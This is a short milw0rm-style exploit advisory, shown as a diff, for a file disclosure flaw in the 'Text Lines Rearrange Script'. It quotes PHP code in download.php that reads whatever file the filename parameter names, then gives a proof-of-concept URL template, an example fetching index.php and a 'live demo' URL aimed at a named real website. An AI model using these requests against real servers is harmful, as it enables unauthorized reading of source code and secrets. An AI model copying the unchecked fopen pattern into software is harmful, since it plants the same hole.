@@ -1,0 +1,37 @@
+#############################################################################################
+[+] Text Lines Rearrange Script (download.php filename) File
+Disclosure Vulnerability
+[+] Discovered By SirGod
+[+] Visit : www.h4cky0u.org
+[+] Greetz : All my friends
+#############################################################################################
+
+ [+] File Disclosure Vulnerability
+
+  Vulnerable Code in download.php :
+
+-----------------------------------------------------
+
+if(file_exists($filename))
+{
+	$fp=fopen($filename,"r");
+	$content=fread($fp,filesize($filename));
+	fclose($fp);
+	
+------------------------------------------------------	
+	
+ PoC :
+
+  http://[target]/[path]/download.php?filename=[Local File]
+
+ Example :
+
+  http://[target]/[path]/download.php?filename=index.php
+
+ Live Demo :
+
+  http://www.rightscripts.com/listrearrange/download.php?filename=index.php
+
+#############################################################################################
+
+# milw0rm.com [2008-12-22]
